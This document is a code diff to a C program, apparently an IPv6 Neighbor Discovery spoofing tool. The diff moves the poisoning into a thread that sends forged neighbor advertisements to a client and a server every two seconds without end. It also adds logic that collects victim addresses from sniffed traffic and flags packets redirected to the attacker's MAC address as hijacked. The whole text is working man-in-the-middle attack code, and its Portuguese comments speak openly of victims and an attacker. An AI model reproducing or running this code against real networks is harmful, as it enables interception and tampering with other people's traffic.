@@ -23,6 +23,7 @@
 #define DEBUG 0
 
 int sniff;
+pthread_t pid0;
 
 void termination_handler(int signum) {
 	/* TODO */
@@ -32,54 +33,64 @@ void termination_handler(int signum) {
 	exit(0);
 }
 
-void poison(struct victim *dst) {
-	int i;
-	char *pkt;
+void *poison(void *destination) {
+	struct victim *dst = (struct victim *)destination;
+	char *pkt1, *pkt2;
 
-	printf("Setting up Client poisoning\n");
+	if (!victim_info_complete(dst) || !victim_info_complete(&svictim)) {
+		printf("Victim not loaded correctly.\n");
+		pthread_exit(NULL);
+	}
+
+	printf("Starting Client and Server poisoning\n");
 	debug_cvivtim(dst);
-	/* Begin Teste */
-	if ((pkt = alloc_ndsolicit(&dst->ipv6))) {
-		send_packet(pkt);
-		free(pkt);
+
+	pkt1 = alloc_ndadvert(&svictim, dst);
+	pkt2 = alloc_ndadvert(dst, &svictim);
+
+	while (1) {
+		/* Poison client */
+		send_packet(pkt1);
+		/* Poison server */
+		send_packet(pkt2);
+		sleep(2);
 	}
-	/* End Teste */
-
-	pkt = alloc_ndadvert(&svictim, dst);
-	//for (i = 0; i < 1000; i++) {
-	for (;;) {
-		send_packet(pkt);
-		sleep(1);
-	}
-
-	free(pkt);
-	printf("Client poisoned\n");
-
-	printf("Setting up Server poisoning\n");
-	pkt = alloc_ndadvert(dst, &svictim);
-
-	for (i = 0; i < 1000; i++) {
-		send_packet(pkt);
-	}
-
-	free(pkt);
-	printf("Server poisoned\n");
+	/* FIXME: Memleaks */
+	free(pkt1);
+	free(pkt2);
+	pthread_exit(NULL);
 }
 
-void populate_cvictim(char *pkt) {
+void get_victims(char *packet) {
 	struct ethhdr *eth;
 	struct ip6_hdr *ip6;
+	struct icmp6_hdr *icmpv6;
+	struct nd_neighbor_solicit *nd;
 
-	eth = (struct ethhdr *)pkt;
+	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
-	printf("Populando CVICTIM\n");
+	if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
+		icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 
-	cvictim = (struct victim *)malloc(sizeof(struct victim));
-	memcpy(&(cvictim->ipv6), &(ip6->ip6_src), sizeof(struct in6_addr));
-	memcpy(&(cvictim->hwaddr), &(eth->h_source), ETH_ALEN);
-
-	debug_cvivtim(cvictim);
+		if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
+			if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
+				memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
+				printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
+			}
+		} else if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
+			nd = (struct nd_neighbor_solicit *)icmpv6;
+			if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
+				if (!victim_info_complete(cvictim))
+					populate_cvictim(packet);
+				if (!cvictim->poisoned) {
+					/* TODO */
+					printf("Thread de poison para o client.\n");
+					pthread_create(&pid0, NULL, poison, cvictim) ;
+				}
+			}
+		}
+	}
 }
 
 void packet_action(char *packet) {
@@ -87,41 +98,14 @@ void packet_action(char *packet) {
 	struct ip6_hdr *ip6;
 	struct icmp6_hdr *icmpv6;
 	struct tcphdr *tcp;
-	struct nd_neighbor_solicit *nd;
 
 	eth = (struct ethhdr *)packet;
 	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
 
-	switch (ip6->ip6_nxt) {
-		case IPPROTO_ICMPV6:
-			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-			/* Se for uma solicitação de discover e o cliente ainda não foi
-			 * "poisoned", dispara o poison. */
-			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
-				nd = (struct nd_neighbor_solicit *)icmpv6;
-				if (!memcmp(&nd->nd_ns_target, &svictim.ipv6, sizeof(struct in6_addr))) {
-					if (!victim_info_complete(cvictim))
-						populate_cvictim(packet);
-
-					if (!cvictim->poisoned) {
-						/* TODO */
-						printf("Thread de poison para o client.\n");
-						/* Sempre que o client enviar um solicitation a gente vai
-						 * envenenar ambas as partes */
-						poison(cvictim);
-					}
-				}
-			}
-			break;
-	}
-
 	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
-		/* Pacote para nossa vitima. */
-		/* Por enquanto é apenas suportado 1 cliente */
-
 		/* Se o mac destino for o do atacante, é pacote roubado */
 		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
-			printf("Packet Hijacked? :-)\n");
+			printf("Packet Hijacked? >:-)\n");
 			debug_packet(packet);
 			/* TODO */
 			switch (ip6->ip6_nxt) {
@@ -140,13 +124,8 @@ void packet_action(char *packet) {
 		switch (ip6->ip6_nxt) {
 			case IPPROTO_ICMPV6:
 				icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
-				if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
-					if (memcmp(&svictim.hwaddr, &eth->h_source, ETH_ALEN) != 0) {
-						memcpy(&(svictim.hwaddr), &(eth->h_source), ETH_ALEN);
-						printf("Gotcha: %s\n", ether_ntoa(&svictim.hwaddr));
-					}
-				}
-				break;
+				/* TODO */
+			break;
 			case IPPROTO_TCP:
 				tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
 				/* TODO */
@@ -159,7 +138,7 @@ void packet_action(char *packet) {
 int main(int argc, char **argv) {
 	struct sockaddr_ll packet_info;
 	struct sigaction saction;
-	char packet_buffer[2048], *pkt;
+	char packet_buffer[2048];
 	int len;
 	int packet_info_size = sizeof(packet_info);
 
@@ -182,17 +161,13 @@ int main(int argc, char **argv) {
 	init_svictim(argv[2]);
 	init_cvictim();
 
-	/* Begin Teste */
-	pkt = alloc_ndsolicit(&svictim.ipv6);
-	send_packet(pkt);
-
-	if (pkt)
-		free(pkt);
-	/* End Teste */
-
 	while ((len = recvfrom(sniff, packet_buffer, 2048, 0,
-						(struct sockaddr*)&packet_info,
-						(socklen_t *)&packet_info_size)) >= 0) {
+			(struct sockaddr*)&packet_info,
+			(socklen_t *)&packet_info_size)) >= 0) {
+
+		if (!victim_info_complete(&svictim) || !victim_info_complete(cvictim))
+			get_victims(packet_buffer);
+		else
 			packet_action(packet_buffer);
 	}
 
